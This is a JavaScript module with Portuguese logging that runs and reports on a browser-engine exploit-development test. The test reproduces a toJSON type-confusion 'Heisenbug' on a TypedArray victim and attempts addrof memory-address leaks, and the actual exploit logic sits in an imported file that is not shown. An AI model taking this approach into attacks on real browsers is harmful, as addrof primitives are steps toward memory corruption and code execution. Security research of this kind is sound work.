// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_SimplifiedLogging,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_SimplifiedLogging";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (SimplifiedLogging) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_SimplifiedLogging(); 

    // Use result.total_probe_calls (que foi retornado corretamente) em vez de acessar a global
    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls_v14 || 0}`, "info", FNAME_RUNNER); 
    if (result.all_probe_calls_details_v14 && result.all_probe_calls_details_v14.length > 0) {
        logS3(`   Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_details_v14)}`, "dev", FNAME_RUNNER);
    }


    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        if (result.errorOccurred.name === 'RangeError') {
            logS3(`     RangeError: Maximum call stack size exceeded OCORREU!`, "vuln", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-SL) RangeError!`; 
         } else {
            document.title = `Heisenbug (TypedArray-SL) ERR: ${result.errorOccurred.name}`;
         }
    } else if (result.potentiallyCrashed) { 
         logS3(`   RESULTADO: POTENCIAL ESTOURO DE PILHA (RangeError). Detalhes da última sonda: ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "critical", FNAME_RUNNER);
         if (!document.title.includes("CONGELOU")) document.title = `Heisenbug (TypedArray-SL) StackOverflow?`;
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da ÚLTIMA chamada da sonda (capturados): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output (truncado): ${result.stringifyResult ? result.stringifyResult.substring(0, 200) + "..." : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugConfirmedByLastProbe = false;
        if (result.toJSON_details && result.toJSON_details.probe_called && 
            result.toJSON_details.this_type_in_toJSON === "[object Object]") {
            heisenbugConfirmedByLastProbe = true;
        }

        if (result.addrof_A_attempt_result && result.addrof_A_attempt_result.success) {
             logS3(`     ADDROF A SUCESSO! ${result.addrof_A_attempt_result.message}`, "vuln", FNAME_RUNNER);
        } else if (result.addrof_A_attempt_result) {
             logS3(`     ADDROF A FALHOU: ${result.addrof_A_attempt_result.message}`, heisenbugConfirmedByLastProbe ? "warn" : "error", FNAME_RUNNER);
        }
        // ... (logs para Addrof B)
        if (result.addrof_B_attempt_result && result.addrof_B_attempt_result.success) {
             logS3(`     ADDROF B SUCESSO! ${result.addrof_B_attempt_result.message}`, "vuln", FNAME_RUNNER);
        } else if (result.addrof_B_attempt_result) {
             logS3(`     ADDROF B FALHOU: ${result.addrof_B_attempt_result.message}`, heisenbugConfirmedByLastProbe ? "warn" : "error", FNAME_RUNNER);
        }


        if (result.toJSON_details && result.toJSON_details.error_in_toJSON) {
            logS3(`     ERRO INTERNO NA ÚLTIMA SONDA: ${result.toJSON_details.error_in_toJSON}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-SL) toJSON_ERR`;
        } else if (heisenbugConfirmedByLastProbe) {
            logS3(`     !!!! TYPE CONFUSION NO 'this' DA ÚLTIMA SONDA OBSERVADA !!!! Tipo: ${result.toJSON_details.this_type_in_toJSON}`, "critical", FNAME_RUNNER);
            // Logar mais detalhes se disponíveis no result.toJSON_details (que é last_actual_probe_details)
            if (result.toJSON_details.this_is_victim_ref !== undefined) { 
                logS3(`       Na última sonda ('this' confuso), 'this' === victim? ${result.toJSON_details.this_is_victim_ref}`, "info");
            }
            if (result.toJSON_details.this_is_prev_probe_return_marker !== undefined) {
                 logS3(`       Na última sonda ('this' confuso), 'this' era o retorno da sonda anterior? ${result.toJSON_details.this_is_prev_probe_return_marker}`, "info");
            }
            if (result.toJSON_details.writes_attempted_on_this) { 
                 logS3(`       Escritas addrof tentadas no 'this' confuso: ${result.toJSON_details.writes_attempted_on_this}`, "info");
                 logS3(`       Chaves do 'this' confuso após escritas: ${result.toJSON_details.this_keys_after_write ? result.toJSON_details.this_keys_after_write.join(',') : 'N/A'}`, "leak");
            }

            if (!document.title.includes("SUCESSO") && !document.title.includes("Addr Falhou")) {
                 document.title = `Heisenbug (TypedArray-SL) Sonda OK, Addr Falhou`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL) || document.title.includes("Probing")) {
            if (!document.title.includes("SUCESSO") && !document.title.includes("Addr Falhou")) {
                 document.title = `Heisenbug (TypedArray-SL) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (SimplifiedLogging) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (SimplifiedLogging) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL)) {
        // Ajustar a lógica de título final
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Falhou") && 
            !document.title.includes("ERR") && !document.title.includes("Sonda OK")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V14_SL} Concluído`;
        }
    }
}
